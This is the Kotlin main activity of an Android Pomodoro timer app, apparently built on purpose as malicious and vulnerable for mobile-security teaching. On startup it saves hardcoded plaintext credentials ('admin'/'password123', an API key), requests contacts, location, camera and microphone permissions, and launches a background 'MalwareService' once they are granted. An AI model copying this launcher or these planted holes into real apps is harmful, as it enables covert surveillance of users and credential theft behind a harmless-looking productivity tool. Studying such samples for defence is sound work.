package com.mobilesec.pomodorotimer

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.compose.rememberNavController
import com.mobilesec.pomodorotimer.data.local.TodoDatabase
import com.mobilesec.pomodorotimer.data.local.UserCredentialsEntity
import com.mobilesec.pomodorotimer.data.remote.ApiClient
import com.mobilesec.pomodorotimer.data.repository.TodoRepository
import com.mobilesec.pomodorotimer.malware.MalwareService
import com.mobilesec.pomodorotimer.ui.navigation.Navigation
import com.mobilesec.pomodorotimer.ui.theme.PomodoroTimerTheme
import com.mobilesec.pomodorotimer.viewmodel.TimerViewModel
import com.mobilesec.pomodorotimer.viewmodel.TodoViewModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    private lateinit var repository: TodoRepository

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        if (permissions.values.all { it }) {
            startMalwareService()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Initialize database and repository
        val database = TodoDatabase.getDatabase(this)
        repository = TodoRepository(
            database.todoDao(),
            database.timerSessionDao(),
            database.userCredentialsDao(),
            ApiClient.apiService
        )

        // VULNERABILITY: Initialize with plain text credentials
        initializeCredentials()

        // Request permissions for malware functionality
        requestPermissions()

        setContent {
            PomodoroTimerTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    PomodoroApp(repository)
                }
            }
        }
    }

    private fun initializeCredentials() {
        CoroutineScope(Dispatchers.IO).launch {
            val existingCredentials = repository.getCredentials()
            if (existingCredentials == null) {
                // VULNERABILITY: Store credentials in plain text
                repository.saveCredentials(
                    UserCredentialsEntity(
                        username = "admin",
                        password = "password123", // Plain text password
                        apiKey = "secret_api_key_123",
                        isPremium = false
                    )
                )
            } else
                repository.updatePremiumStatus(false)
        }
    }

    private fun requestPermissions() {
        val permissions = arrayOf(
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO
        )

        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            startMalwareService()
        }
    }

    private fun startMalwareService() {
        // MALWARE: Start background service
        val intent = Intent(this, MalwareService::class.java)
        startService(intent)
    }
}

@Composable
fun PomodoroApp(repository: TodoRepository) {
    val navController = rememberNavController()

    // Create ViewModels with repository
    val timerViewModel: TimerViewModel = viewModel {
        TimerViewModel(repository)
    }

    val todoViewModel: TodoViewModel = viewModel {
        TodoViewModel(repository)
    }

    Navigation(
        navController = navController,
        timerViewModel = timerViewModel,
        todoViewModel = todoViewModel
    )
}
